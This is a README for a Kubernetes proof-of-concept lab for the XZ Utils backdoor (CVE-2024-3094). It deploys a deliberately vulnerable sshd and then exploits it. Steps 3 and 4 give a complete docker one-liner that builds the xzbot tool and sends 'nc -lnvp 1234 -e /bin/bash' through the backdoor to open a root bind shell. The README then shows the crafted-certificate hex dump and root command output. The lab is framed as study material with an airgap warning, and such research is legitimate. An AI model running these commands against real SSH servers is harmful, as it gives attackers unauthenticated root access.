# xzwhy
```
 _  _  ____  _  _ 
( \/ )(_   )( \/ )
 )  (  / /_  \  / 
(_/\_)(____) (__) 

```

This project is a Kubernetes friendly Proof of Concept (POC) for [CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094) affecting XZ Utils. See [this article](https://pentest-tools.com/blog/xz-utils-backdoor-cve-2024-3094) for an excellent walkthrough of the exploit's provenance and mechanics.

# WARNING 
⚠⚠⚠

Running any of the commands below may result in the deployment of a vulnerable application that is highly susceptible to attack. If you choose to follow these steps, it is recommended that you do so in an airgapped test environment. 

⚠⚠⚠


## Instructions


### 1: Roll out the vulnerable application
```
kubectl create -f xzwhy.yml
```

### 2: Obtain the vulnerable endpoint's URL
The vulnerable SSH endpoint exposes two ports via a load balancer: 2222 is listening for SSH connections and 1234 is a convenience to allow ingress on a bind shell port that we will use during the exploit
```
  type: LoadBalancer
  ports:
    - name: ssh
      protocol: TCP
      port: 2222
      targetPort: 2222
    - name: exploitshellingress
      protocol: TCP
      port: 1234
      targetPort: 1234
```

We can extract the deployed loadbalancer's URL using kubectl:
```
xzwhy_endpoint=`kubectl get services -o jsonpath='{.items[0].status.loadBalancer.ingress[0].hostname}' --namespace=xzwhy-ns --field-selector metadata.name=xzwhy-loadbalancer` && echo $xzwhy_endpoint
```


### 3: Initiate the attack by making a malicious SSH connection
Now we connect to the vulnerable server using the [teamnautilus/xzbot](https://hub.docker.com/r/teamnautilus/xzbot) utility:
```
docker run -it --rm golang:latest /bin/bash -c "mkdir -p /xzbot && pushd /xzbot/ && git clone https://github.com/amlweems/xzbot.git && ls -laF && pushd ./xzbot/ && go build -o /xzbot/tmp/; popd && /xzbot/tmp/xzbot -h && /xzbot/tmp/xzbot -addr $xzwhy_endpoint:2222 -cmd 'nc -lnvp 1234 -e /bin/bash'"
```

The entrypoint of this container is ```entrypoint: /bin/bash -c "env -i LANG=en_US.UTF-8 && unset TERM && unset LD_DEBUG && LD_LIBRARY_PATH=/CVE-2024-3094/ /usr/sbin/sshd -p 2222 -D"```

This will cause the vulnerable SSH server to execute a bind shell via ```nc -lnvp 1234 -e /bin/bash``` on our behalf. After running this command you should see something similar to:
```
Cloning into 'xzbot'...
remote: Enumerating objects: 30, done.
remote: Counting objects: 100% (30/30), done.
remote: Compressing objects: 100% (20/20), done.
remote: Total 30 (delta 14), reused 25 (delta 10), pack-reused 0
Receiving objects: 100% (30/30), 422.65 KiB | 8.99 MiB/s, done.
Resolving deltas: 100% (14/14), done.
total 12
drwxr-xr-x 3 root root 4096 Apr 17 22:37 ./
drwxr-xr-x 1 root root 4096 Apr 17 22:37 ../
drwxr-xr-x 4 root root 4096 Apr 17 22:37 xzbot/
/xzbot/xzbot /xzbot /go
go: downloading github.com/cloudflare/circl v1.3.7
go: downloading golang.org/x/crypto v0.21.0
go: downloading golang.org/x/sys v0.18.0
/xzbot /go
Usage of /xzbot/tmp/xzbot:
  -addr string
        ssh server address (default "127.0.0.1:2222")
  -cmd string
        command to run via system() (default "id > /tmp/.xz")
  -seed string
        ed448 seed, must match xz backdoor key (default "0")
00000000  00 00 00 1c 73 73 68 2d  72 73 61 2d 63 65 72 74  |....ssh-rsa-cert|
00000010  2d 76 30 31 40 6f 70 65  6e 73 73 68 2e 63 6f 6d  |-v01@openssh.com|
00000020  00 00 00 00 00 00 00 03  01 00 01 00 00 01 01 01  |................|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000100  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000120  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000130  00 00 00 00 00 00 00 00  00 00 00 01 00 00 00 00  |................|
00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000160  00 00 01 14 00 00 00 07  73 73 68 2d 72 73 61 00  |........ssh-rsa.|
00000170  00 00 01 01 00 00 01 00  34 12 00 00 78 56 00 00  |........4...xV..|
00000180  a2 ff d9 f9 ff ff ff ff  a1 36 c4 cc b3 b2 4d b3  |.........6....M.|
00000190  99 11 52 a7 2c 38 d2 29  f9 5d 1a 06 63 36 1e 48  |..R.,8.).]..c6.H|
000001a0  9c 95 4e f1 77 41 07 92  1c a4 9f b0 b4 dc 93 c2  |..N.wA..........|
000001b0  66 03 3d fa 5c 8b 49 41  86 26 42 88 2b 9d 5b 4c  |f.=.\.IA.&B.+.[L|
000001c0  b8 a4 5e 9d 62 c3 51 0a  be ca 5d 8a 47 45 3a 1e  |..^.b.Q...].GE:.|
000001d0  99 1f c1 0e 97 b7 58 ec  51 45 5b 24 3f b4 69 6a  |......X.QE[$?.ij|
000001e0  68 45 7c 3b 3a d9 d7 0a  ad 09 04 d8 a1 b9 81 22  |hE|;:.........."|
000001f0  58 69 eb 07 ad 91 53 15  b2 1d bf 47 b9 48 a0 4e  |Xi....S....G.H.N|
00000200  8b 28 cd 82 4b fd 72 17  12 ce 7f e7 15 3c 9e fa  |.(..K.r......<..|
00000210  a7 e1 d6 e4 ec eb 66 34  5a 74 00 00 00 00 00 00  |......f4Zt......|
00000220  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000230  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000240  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000250  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000260  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000270  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 07  |................|
00000280  73 73 68 2d 72 73 61 00  00 00 01 00              |ssh-rsa.....|
```

### 4: Profit
Connect to the shell you spawned. Note the use of the xzwhy_endpoint variable:
```
docker run -it --rm golang:latest /bin/bash -c "mkdir -p /xzbot && pushd /xzbot/ && git clone https://github.com/amlweems/xzbot.git && ls -laF && pushd ./xzbot/ && go build -o /xzbot/tmp/; popd && /xzbot/tmp/xzbot -h && /xzbot/tmp/xzbot -addr $xzwhy_endpoint:2222 -cmd 'nc -lnvp 1234 -e /bin/bash'"
```

It isn't immediately obvious, but the command above should now be connected to the remote bind shell. You can test this by running various commands:
```
whoami
root
```

```
ls -liart
total 0
29377113 drwxr-xr-x   2 root root   6 Jun 11  2023 home
26259491 drwxr-xr-x   2 root root   6 Jun 11  2023 boot
24205734 drwxr-xr-x   1 root root  41 Mar 11 00:00 var
40912790 drwxr-xr-x   1 root root  30 Mar 11 00:00 usr
37758063 drwxr-xr-x   2 root root   6 Mar 11 00:00 srv
15748188 lrwxrwxrwx   1 root root   8 Mar 11 00:00 sbin -> usr/sbin
32522820 drwxr-xr-x   2 root root   6 Mar 11 00:00 opt
31465607 drwxr-xr-x   2 root root   6 Mar 11 00:00 mnt
30427284 drwxr-xr-x   2 root root   6 Mar 11 00:00 media
15748187 lrwxrwxrwx   1 root root   9 Mar 11 00:00 lib64 -> usr/lib64
15748186 lrwxrwxrwx   1 root root   7 Mar 11 00:00 lib -> usr/lib
15748184 lrwxrwxrwx   1 root root   7 Mar 11 00:00 bin -> usr/bin
12633381 drwx------   1 root root  18 Mar 30 12:22 root
       1 dr-xr-xr-x  13 root root   0 Apr 17 21:44 sys
34652905 drwxr-xr-x   1 root root  61 Apr 17 22:26 ..
34652905 drwxr-xr-x   1 root root  61 Apr 17 22:26 .
       1 dr-xr-xr-x 166 root root   0 Apr 17 22:26 proc
 3413214 drwxr-xr-x   1 root root  39 Apr 17 22:26 etc
       1 drwxr-xr-x   5 root root 360 Apr 17 22:26 dev
39855738 drwxrwxrwt   1 root root   6 Apr 17 22:26 tmp
14845582 drwxr-xr-x   1 root root  37 Apr 17 22:26 run

```


### 5: Cleanup
```
kubectl delete -f xzwhy.yml
```


# Credits

* [teamnautilus](https://hub.docker.com/r/teamnautilus/xzbot) created a [server vulnerable to the exploit](https://hub.docker.com/r/teamnautilus/xzbot)
* [amlweems](https://github.com/amlweems/xzbot.git) published an automated tool for exploiting vulnerable SSH endpoints
* [patorjk](https://patorjk.com/software/taag/#p=testall&f=Graffiti&t=xzy) created an excellent text-to-ascii art generator
